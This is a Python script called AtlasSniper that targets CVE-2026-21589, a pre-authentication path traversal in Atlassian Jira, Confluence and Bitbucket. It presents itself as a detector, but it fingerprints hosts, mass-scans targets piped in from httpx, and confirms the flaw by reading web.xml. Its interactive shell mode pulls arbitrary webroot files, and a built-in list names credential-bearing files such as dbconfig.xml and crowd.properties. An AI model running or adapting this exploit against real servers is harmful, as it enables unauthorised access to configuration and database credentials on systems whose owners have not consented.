#!/usr/bin/env python3
"""AtlasSniper — CVE-2026-21589 detect.

Pre-auth webroot file read in atlassian-plugins-webresource.
:: is treated as a slash. Confirm only on WEB-INF/web.xml or urlrewrite.xml.
"""

import argparse
import json
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.stderr.write("pip install requests\n")
    raise SystemExit(1)

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
D = "\033[2m"
B = "\033[1m"
X = "\033[0m"

BANNER = f"""{C}{B}
    █████╗ ████████╗██╗      █████╗ ███████╗███████╗███╗   ██╗██╗██████╗ ███████╗██████╗
   ██╔══██╗╚══██╔══╝██║     ██╔══██╗██╔════╝██╔════╝████╗  ██║██║██╔══██╗██╔════╝██╔══██╗
   ███████║   ██║   ██║     ███████║███████╗███████╗██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝
   ██╔══██║   ██║   ██║     ██╔══██║╚════██║╚════██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗
   ██║  ██║   ██║   ███████╗██║  ██║███████║███████║██║ ╚████║██║██║     ███████╗██║  ██║
   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
{X}{C}  AtlasSniper  ·  CVE-2026-21589  ·  webresource :: traversal  ·  detect
  Mitsec  ·  x.com/ynsmroztas
{X}"""

ROUTES = ("resources", "sources", "batch", "contextbatch/js", "contextbatch/css")
ANCHOR = "jira.webresources:color-picker-popup/images/"
CONF_ANCHOR = "com.atlassian.confluence.plugins.dashboard-actions/images/"
BB_ANCHOR = "com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/"


def trav(n, enc):
    step = "..%3a%3a" if enc else "..::"
    sep = "%3a%3a" if enc else "::"
    return step * n + sep


def probes():
    out = []
    for enc in (True, False):
        t = "{trav}"
        out.append(("jira", f"/download/resources/{ANCHOR}{t}WEB-INF{('%3a%3a' if enc else '::')}web.xml", "<web-app", enc))
        out.append(("confluence", f"/s/1/_/download/resources/{CONF_ANCHOR}{t}WEB-INF{('%3a%3a' if enc else '::')}web.xml", "<web-app", enc))
        out.append(("bitbucket", f"/s/1.0/_/download/resources/{BB_ANCHOR}{t}WEB-INF{('%3a%3a' if enc else '::')}urlrewrite.xml", "<urlrewrite", enc))
        for route in ROUTES:
            if route == "resources":
                continue
            out.append(("jira", f"/download/{route}/{ANCHOR}{t}WEB-INF{('%3a%3a' if enc else '::')}web.xml", "<web-app", enc))
    return out

FINGER = [
    ("/status", "jira"),
    ("/rest/api/2/serverInfo", "jira"),
    ("/login.action", "confluence"),
    ("/rest/api/latest/server", "bitbucket"),
]


def confirm(c):
    saw_404 = 0
    saw = 0
    for name, tmpl, marker, enc in probes():
        for depth in (5, 6, 7, 8, 4, 3):
            path = tmpl.format(trav=trav(depth, enc))
            code, body, _ = c.get(path)
            saw += 1
            if code == 404:
                saw_404 += 1
            if code == 200 and strong(body, marker):
                return {
                    "product": name,
                    "path": path,
                    "marker": marker,
                    "len": len(body),
                    "enc": "%3a%3a" if enc else "::",
                    "sample": body[:180].replace("\n", " "),
                    "body": body,
                }
    if saw and saw_404 == saw:
        return {"patched": True}
    return None


def norm(url):
    url = url.strip()
    if not url or url.startswith("#"):
        return None
    # httpx without -silent prints [INF]/[WRN] and a banner. Those lines
    # start with '[' and urlparse treats the bracket as an IPv6 netloc.
    if url[0] in "[{":
        return None
    token = url.split()[0].strip("\"'")
    if "://" not in token:
        if not re.match(r"^[A-Za-z0-9._:-]+$", token):
            return None
        token = "https://" + token
    try:
        p = urlparse(token)
    except ValueError:
        return None
    host = p.netloc
    if not host or host.startswith("[") or " " in host:
        return None
    if not re.match(r"^[A-Za-z0-9._:-]+$", host):
        return None
    return f"{p.scheme}://{host}"


class Client:
    def __init__(self, base, timeout, proxy):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers["User-Agent"] = "AtlasSniper/1.0"
        self.timeout = timeout
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}

    def get(self, path):
        try:
            # Keep %3a on the wire. requests would turn it into %253a.
            r = self.s.get(self.base + path, timeout=self.timeout, allow_redirects=False)
            if "%253a" in (r.request.url or "").lower() and "%3a" in path.lower():
                req = requests.Request("GET", self.base + "/")
                pre = self.s.prepare_request(req)
                pre.url = self.base + path
                r = self.s.send(pre, timeout=self.timeout, allow_redirects=False)
            return r.status_code, r.text or "", dict(r.headers)
        except requests.RequestException as e:
            return 0, str(e), {}


def fingerprint(c):
    blob = []
    product = "unknown"
    for path, guess in FINGER:
        code, body, hdr = c.get(path)
        if code == 0:
            continue
        blob.append(body[:400].lower() + " " + " ".join(h.lower() for h in hdr))
        if code in (200, 401, 302) and product == "unknown":
            product = guess
    text = " ".join(blob)
    if "confluence" in text:
        product = "confluence"
    elif "bitbucket" in text:
        product = "bitbucket"
    elif "jira" in text or "atlassian" in text:
        product = "jira"
    ver = None
    m = re.search(r'"version"\s*:\s*"([0-9][^"]+)"', text)
    if m:
        ver = m.group(1)
    return product, ver


def strong(body, marker):
    if marker not in body:
        return False
    low = body[:800].lower()
    if "<html" in low and marker not in body[:200]:
        return False
    if marker == "<web-app":
        return "servlet" in body.lower() or "web-app" in body
    return "<urlrewrite" in body


FILES = [
    "WEB-INF/web.xml",
    "WEB-INF/urlrewrite.xml",
    "WEB-INF/classes/seraph-config.xml",
    "WEB-INF/classes/seraph-paths.xml",
    "WEB-INF/classes/crowd.properties",
    "WEB-INF/classes/crowd-ehcache.xml",
    "WEB-INF/classes/jira-application.properties",
    "WEB-INF/classes/jira-config.properties",
    "WEB-INF/classes/entityengine.xml",
    "WEB-INF/classes/osuser.xml",
    "WEB-INF/classes/atlassian-user.xml",
    "WEB-INF/classes/application.properties",
    "WEB-INF/classes/dbconfig.xml",
    "WEB-INF/classes/log4j.properties",
    "WEB-INF/classes/log4j2.xml",
    "WEB-INF/classes/logging.properties",
    "WEB-INF/classes/confluence-init.properties",
    "WEB-INF/classes/applicationContext.xml",
    "WEB-INF/decorators.xml",
    "META-INF/MANIFEST.MF",
]


def resolve(name):
    name = name.strip().lstrip("/")
    if not name:
        return None
    if "/" in name:
        return name
    hits = [f for f in FILES if f.endswith("/" + name) or f == name]
    return hits[0] if hits else "WEB-INF/classes/" + name


def show_file(c, hit, rel):
    code, path, body = read_file(c, hit, rel)
    print(f"  {curl_of(c.base, path)}")
    if not body:
        print(f"  {Y}no file  http={code}{X}")
        return
    print(f"{C}  ┌─ {rel}  len={len(body)}{X}")
    for line in body.splitlines():
        print(f"{D}  │{X} {line}")
    print(f"{C}  └─{X}")


def curl_of(base, path):
    return "curl -sk " + "'" + base + path + "'"


def read_file(c, hit, rel):
    rel = rel.strip().lstrip("/")
    if not rel or "://" in rel:
        return None
    rel = rel.replace("/", "::")
    sep = "%3a%3a" if "%3a%3a" in hit["path"] else "::"
    rel = rel.replace("::", sep)
    key = "WEB-INF" + sep
    base = hit["path"].split(key)[0]
    path = base + rel
    code, body, _ = c.get(path)
    if code == 200 and body and "<html" not in body[:200].lower():
        return code, path, body
    return code, path, None


def probe_files(c, hit):
    print(f"{D}  webroot only{X}")
    for rel in FILES:
        code, path, body = read_file(c, hit, rel)
        if body:
            print(f"{G}  HIT{X}  {rel}  http={code}  len={len(body)}")
        else:
            print(f"{Y}  miss{X}  {rel}  http={code}")


def shell(c, hit):
    host = urlparse(c.base).netloc
    print(f"\n{R}{B}  VULN{X}  {c.base}  {hit['product']}  {hit['marker']}  len={hit['len']}")
    print(f"  {curl_of(c.base, hit['path'])}")
    print(f"{C}mitsec@{host}{X}  files | files <name> | read <path> | curl | exit")
    while True:
        try:
            cmd = input(f"{C}mitsec@{host}{X} ▶ ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if cmd in ("exit", "quit", "q"):
            return
        if cmd == "files":
            probe_files(c, hit)
            continue
        if cmd.startswith("files "):
            show_file(c, hit, resolve(cmd[6:]))
            continue
        if cmd in ("webxml", "rewrite"):
            show_file(c, hit, "WEB-INF/web.xml" if cmd == "webxml" else "WEB-INF/urlrewrite.xml")
            continue
        if cmd == "curl":
            print(f"  {curl_of(c.base, hit['path'])}")
            continue
        if cmd.startswith("read "):
            show_file(c, hit, resolve(cmd[5:]))
            continue
        print("  files | files web.xml | files seraph-config.xml | read <path> | curl | exit")


def scan_one(url, timeout, proxy, want_shell):
    c = Client(url, timeout, proxy)
    product, ver = fingerprint(c)
    print(f"{D}[radar]{X} {url}  product={product}  ver={ver or '?'}")
    hit = confirm(c)
    if hit and hit.get("patched"):
        print(f"{Y}  PATCH{X}  {url}  router 404 on every probe")
        return {"url": url, "status": "patched", "product": product, "version": ver}
    if not hit:
        print(f"{G}  SAFE{X}  {url}")
        return {"url": url, "status": "safe", "product": product, "version": ver}
    print(f"{R}{B}  VULN{X}  {url}  {hit['product']}  {hit['marker']}  len={hit['len']}")
    print(f"  {curl_of(url, hit['path'])}")
    if want_shell:
        shell(c, hit)
    return {
        "url": url,
        "status": "vuln",
        "product": hit["product"],
        "version": ver,
        "path": hit["path"],
        "len": hit["len"],
    }


def load_targets(args):
    out = []
    if args.url:
        n = norm(args.url)
        if n:
            out.append(n)
    if not sys.stdin.isatty():
        for line in sys.stdin:
            n = norm(line)
            if n:
                out.append(n)
    # unique, keep order
    seen = set()
    uniq = []
    for u in out:
        if u not in seen:
            seen.add(u)
            uniq.append(u)
    return uniq


def main():
    p = argparse.ArgumentParser(description="CVE-2026-21589 webroot read detect")
    p.add_argument("-u", "--url", help="single target")
    p.add_argument("--shell", action="store_true", help="drop shell on VULN (single target)")
    p.add_argument("-t", "--threads", type=int, default=10)
    p.add_argument("--timeout", type=int, default=12)
    p.add_argument("--proxy", help="http://127.0.0.1:8080")
    p.add_argument("-o", "--json", help="write json results")
    args = p.parse_args()
    print(BANNER)
    targets = load_targets(args)
    if not targets:
        p.print_help()
        print("\n  echo host | httpx -silent | python3 AtlasSniper.py")
        return
    if args.shell and len(targets) != 1:
        print(f"{Y}--shell is single-target{X}")
        args.shell = False
    results = []
    if len(targets) == 1:
        results.append(scan_one(targets[0], args.timeout, args.proxy, args.shell))
    else:
        lock = threading.Lock()
        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
            futs = [ex.submit(scan_one, u, args.timeout, args.proxy, False) for u in targets]
            for f in as_completed(futs):
                with lock:
                    results.append(f.result())
    vuln = sum(1 for r in results if r["status"] == "vuln")
    print(f"\n{B}[sum]{X} targets={len(results)}  {R}vuln={vuln}{X}  {G}safe={len(results)-vuln}{X}")
    if args.json:
        with open(args.json, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"{D}wrote {args.json}{X}")


if __name__ == "__main__":
    main()
